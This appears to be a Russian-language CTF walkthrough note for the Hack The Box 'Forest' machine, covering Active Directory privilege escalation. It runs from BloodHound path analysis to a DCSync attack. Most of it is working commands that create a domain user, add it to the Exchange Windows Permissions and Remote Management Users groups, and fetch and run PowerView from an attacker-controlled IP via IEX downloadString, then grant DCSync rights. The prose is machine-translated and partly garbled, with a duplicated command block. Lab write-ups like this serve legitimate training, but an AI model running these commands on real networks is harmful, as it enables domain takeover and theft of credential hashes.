# BLOOD


Одна из вложенных групп оказывается акаунт оператор
согласнодокументация , члены
изменять пользователей и добавлять их в незащищенные группы. Давайте это учтем и посмотрим пути к Администраторам
домена. Нажмите на и выберите .
Операторы счетов , которая является привилегированной группой AD.
группе разрешено создаватьОператоры счетов
Запросы Кратчайший путь к важным целям



Один из путей показывает, что в группе разрешений Windows Exchange есть WriteDacl.
 привилегии в домене.  Привилегия WriteDACL дает пользователю возможность добавлять списки ACL в
 объект.  Это означает, что мы можем добавить пользователя в эту группу и предоставить ему привилегии DCSync.
 Вернитесь в оболочку WinRM и добавьте нового пользователя в разрешения Exchange Windows, а также
 группа «Пользователи удаленного управления».



net user max abc123! /add /domain

 net group "Exchange Windows Permissions" max /add

 net localgroup "remote management users" max /add

 net group "Exchange Windows Permissions" max /add

net localgroup "remote management users" max /add

----------Это дает акаунт оператор-----


IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('htb\max', $SecPassword)

$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred

Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync

----------это дает Exchange Windows Permissions-------------



 
